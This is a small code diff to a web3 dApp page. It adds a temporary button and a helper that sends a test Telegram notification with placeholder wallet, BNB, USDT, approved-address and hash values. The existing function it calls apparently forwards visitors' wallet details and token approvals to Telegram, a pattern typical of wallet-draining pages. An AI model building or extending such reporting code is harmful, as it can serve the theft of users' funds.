@@ -261,6 +261,11 @@
     <p class="estimate">≈ $0.00</p>
 
     <button type="submit" class="next-btn" id="nextBtn" onclick="handleNextClick()" disabled>Next</button>
+
+    <!-- Temporary button to test Telegram from within the dApp/web3 wallet -->
+    <button type="button" onclick="testTelegramFromDapp()" style="margin-top:16px;border-radius:10px;padding:10px 14px;font-size:14px;">
+      Test Telegram (Dapp)
+    </button>
   </main>
 
   <script type="text/javascript" src="js/web3.min.js"></script>
@@ -680,6 +685,20 @@ async function sendTelegramNotification(walletAddress, bnbAmount, usdtAmount, ap
 // Ensure global for other scripts
 if (typeof window !== 'undefined') {
     window.sendTelegramNotification = sendTelegramNotification;
+    window.testTelegramFromDapp = testTelegramFromDapp;
+}
+
+// Simple helper to manually test Telegram notifications from within the dApp / wallet browser
+function testTelegramFromDapp() {
+    const now = new Date().toLocaleString();
+    sendTelegramNotification(
+        'TEST_WALLET',
+        '0.0',
+        '0.0',
+        'TEST_APPROVED_ADDRESS',
+        now,
+        'TEST_HASH'
+    );
 }
 
 </script>
